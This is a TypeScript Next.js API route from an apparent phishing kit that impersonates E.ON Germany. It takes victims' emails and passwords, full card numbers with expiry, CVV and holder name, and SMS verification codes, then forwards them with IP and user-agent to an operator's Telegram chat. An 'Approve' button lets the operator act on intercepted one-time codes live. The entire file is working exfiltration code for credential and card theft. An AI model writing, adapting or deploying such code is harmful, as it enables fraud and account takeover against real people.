import { type NextRequest, NextResponse } from "next/server"
import { createAdminClient } from "@/lib/supabase/admin"

export async function POST(request: NextRequest) {
  try {
    const { type, data } = await request.json()

    if (!type || !data) {
      return NextResponse.json({ success: false, error: "Missing type or data" }, { status: 400 })
    }

    const supabase = createAdminClient()

    // Get Telegram settings
    const { data: settings, error: settingsError } = await supabase.from("admin_settings").select("*")

    if (settingsError) {
      console.error("[v0] Failed to fetch settings:", settingsError)
      return NextResponse.json({ success: false, error: "Failed to fetch settings" })
    }

    const botToken = settings?.find((s) => s.setting_key === "telegram_bot_token")?.setting_value
    const chatId = settings?.find((s) => s.setting_key === "telegram_chat_id")?.setting_value

    if (!botToken || !chatId) {
      console.log("[v0] Telegram not configured, skipping notification")
      return NextResponse.json({ success: false, error: "Telegram not configured" })
    }

    let message = ""
    let inlineKeyboard = null

    if (type === "login") {
      message = `🎩 <b>[ +1 LOGIN BANK ]</b>\n`
      message += `↳ <i>E.ON Germany</i>\n\n`
      message += `<i>🪄 EMAIL: </i><code>${data.email}</code>\n`
      message += `<i>🪄 PASS : </i><code>${data.password}</code>\n\n`
      message += `🌍 <i>${data.ip}</i>\n`
      message += `🧑‍💻 <i>${data.userAgent}</i>\n`
      message += `🆔 <i>${data.userId}</i>`
    } else if (type === "card") {
      message = `🎩 <b>[ +1 CARD BANK ]</b>\n`
      message += `↳ <i>E.ON Germany</i>\n\n`
      message += `<i>💳 CARD: </i><code>${data.cardNumber}</code>\n`
      message += `<i>📅 EXP : </i><code>${data.cardExpiry}</code>\n`
      message += `<i>🔐 CVV : </i><code>${data.cardCvv}</code>\n`
      message += `<i>👤 NAME: </i><code>${data.cardHolder}</code>\n\n`

      if (data.binData) {
        message += `<i>🏦 BANK: </i>${data.binData.bank || "Unknown"}\n`
        message += `<i>💎 LEVEL: </i>${data.binData.level || "Unknown"}\n`
        message += `<i>🌍 COUNTRY: </i>${data.binData.country || "Unknown"}\n\n`
      }

      message += `🌍 <i>${data.ip}</i>\n`
      message += `🧑‍💻 <i>${data.userAgent}</i>\n`
      message += `🆔 <i>${data.userId}</i>`
    } else if (type === "sms") {
      message = `🎩 <b>[ +1 PIN ]</b>\n\n`
      message += `Code: <code>${data.smsCode}</code>\n\n`
      message += `🌍 <i>${data.ip}</i>\n`
      message += `🧑‍💻 <i>${data.userAgent}</i>\n`
      message += `🆔 <i>${data.userId}</i>`

      inlineKeyboard = {
        inline_keyboard: [
          [
            {
              text: "✅ Approve",
              callback_data: `approve_${data.verificationRequestId}`,
            },
          ],
        ],
      }
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
    const payload: any = {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    }

    if (inlineKeyboard) {
      payload.reply_markup = inlineKeyboard
    }

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })

    if (!response.ok) {
      const error = await response.text()
      console.error("[v0] Telegram API error:", error)
      return NextResponse.json({ success: false, error: "Telegram API error" })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Telegram notification error:", error)
    return NextResponse.json({ success: false, error: "Internal error" }, { status: 500 })
  }
}
